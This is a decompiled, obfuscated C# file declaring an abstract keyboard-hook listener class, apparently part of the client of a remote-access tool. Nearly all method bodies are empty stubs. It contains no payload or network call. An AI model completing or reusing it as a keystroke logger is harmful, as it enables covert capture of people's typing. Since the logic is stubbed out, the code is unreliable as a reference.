using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;

namespace xClient.Core.MouseKeyHook.Implementation;

internal abstract class KeyListener : BaseListener, GInterface0
{
	[CompilerGenerated]
	private KeyEventHandler KeyDown;

	[CompilerGenerated]
	private KeyPressEventHandler KeyPress;

	[CompilerGenerated]
	private KeyEventHandler KeyUp;

	private static KeyListener FUj1LJDro1WlQk1xLd3;

	public event KeyEventHandler Event_0
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event KeyPressEventHandler Event_1
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event KeyEventHandler Event_2
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	protected KeyListener(Delegate1 subscribe)
	{
	}

	public void InvokeKeyDown(GEventArgs0 e)
	{
	}

	public void InvokeKeyPress(GEventArgs1 e)
	{
	}

	public void InvokeKeyUp(GEventArgs0 e)
	{
	}

	protected override bool Callback(Struct1 data)
	{
		return true;
	}

	protected abstract IEnumerable<GEventArgs1> GetPressEventArgs(Struct1 data);

	protected abstract GEventArgs0 GetDownUpEventArgs(Struct1 data);

	static KeyListener()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		LX3xRTDM7RNwUv5OXoR();
	}

	internal static void BaCj4TDiRaFQQ4iw85i()
	{
	}

	internal static bool BE2mBRDEDIFh83EV08q()
	{
		return true;
	}

	internal static KeyListener UuS250DOQU5R6dsYHs4()
	{
		return null;
	}

	internal static object sZkJnFD9gDFrxVlDgZK(object object_0, object object_1)
	{
		return null;
	}

	internal static object UGU5BnD5mrdwWChJtuF(object object_0, object object_1)
	{
		return null;
	}

	internal static bool HXuEowD43c5Ff26apx0(object object_0)
	{
		return true;
	}

	internal static void RV78MXDheFKSIbjKeUA(object object_0, object object_1, object object_2)
	{
	}

	internal static bool b9ihPxDwlC4DDumTyg3(object object_0)
	{
		return true;
	}

	internal static bool NS8NwHDyRf47AiJIS2P(object object_0)
	{
		return true;
	}

	internal static void yvyluYDlMsBJlviTlsV(object object_0, object object_1, object object_2)
	{
	}

	internal static object xoNyinDHqn1TBTMNQ7j(object object_0, Struct1 data)
	{
		return null;
	}

	internal static void OQNs3ZDVR2ZHkFOHhSj(object object_0)
	{
	}

	internal static void LX3xRTDM7RNwUv5OXoR()
	{
	}
}
